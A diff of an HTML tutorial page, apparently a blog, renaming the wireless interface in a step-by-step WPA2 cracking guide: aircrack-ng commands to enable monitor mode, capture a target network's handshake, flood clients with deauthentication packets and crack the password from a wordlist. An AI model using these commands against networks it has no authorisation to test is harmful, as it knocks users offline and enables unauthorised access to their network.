@@ -211,32 +211,32 @@ be executed as the <code>root</code> user, e.g. using <code>sudo</code>.</p>
 <p>List all possible programs that could interfere with the wireless card. If
 <code>kill</code> is specified, it will try to kill all of them.</p>
 <pre tabindex="0"><code># airmon-ng check kill
-</code></pre><p>Enable monitor mode on an interface (here it&rsquo;s <code>wlp3s0</code>) and check if it worked</p>
-<pre tabindex="0"><code># airmon-ng start wlp3s0
+</code></pre><p>Enable monitor mode on an interface (here it&rsquo;s <code>wlan0</code>) and check if it worked.</p>
+<pre tabindex="0"><code># airmon-ng start wlan0
 # airmon-ng
 </code></pre><h2 id="capture-handshake">
   Capture handshake
   <a href="#capture-handshake" class="h-anchor" aria-hidden="true">#</a>
 </h2>
 <p>List Wi-Fi networks and their BSSIDs, Channels, etc.</p>
-<pre tabindex="0"><code># airodump-ng wlp3s0mon
+<pre tabindex="0"><code># airodump-ng wlan0mon
 </code></pre><p>Narrow search down to specific BSSID (MAC address).</p>
-<pre tabindex="0"><code># airodump-ng wlp3s0mon -d &lt;BSSID&gt;
-</code></pre><p>Capture WPA2 handshake and write it to file (e.g. <code>handshake1-01.cap</code>). Remember
+<pre tabindex="0"><code># airodump-ng wlan0mon -d &lt;BSSID&gt;
+</code></pre><p>Capture WPA2 handshake and write it to file (e.g. <code>handshake-01.cap</code>). Remember
 to change interface name, if needed.</p>
-<pre tabindex="0"><code># airodump-ng -w handshake -c &lt;channel&gt; --bssid &lt;BSSID&gt; wlp3s0mon
+<pre tabindex="0"><code># airodump-ng -w handshake -c &lt;channel&gt; --bssid &lt;BSSID&gt; wlan0mon
 </code></pre><p><strong>Optional in other terminal:</strong> Simultaniously send deauthentication packets to
 clients on the network to capture WPA2 handshake by forcing clients to
 reauthenticate. Without this step, it might take some time to capture the
 handshake.</p>
-<pre tabindex="0"><code># aireplay-ng --deauth 0 -a &lt;BSSID&gt; wlp3s0mon
+<pre tabindex="0"><code># aireplay-ng --deauth 0 -a &lt;BSSID&gt; wlan0mon
 </code></pre><h2 id="crack-password">
   Crack password
   <a href="#crack-password" class="h-anchor" aria-hidden="true">#</a>
 </h2>
-<p>After storing the handshake in e.g. <code>handshake1-01.cap</code>, we can finally crack the
+<p>After storing the handshake in e.g. <code>handshake-01.cap</code>, we can finally crack the
 password using <code>aircrack-ng</code>.</p>
-<pre tabindex="0"><code># aircrack-ng handshake1-01.cap -w dictionary.txt
+<pre tabindex="0"><code># aircrack-ng handshake-01.cap -w dictionary.txt
 </code></pre><p>Alternatively, we can extract the handshake from the <code>.cap</code> capture file and
 convert it to a modern hashcat compatible hash file using
 <a href="https://hashcat.net/cap2hashcat">hashcat.net/cap2hashcat</a>, which can then be cracked using <a href="https://hashcat.net/hashcat">hashcat</a>.</p>
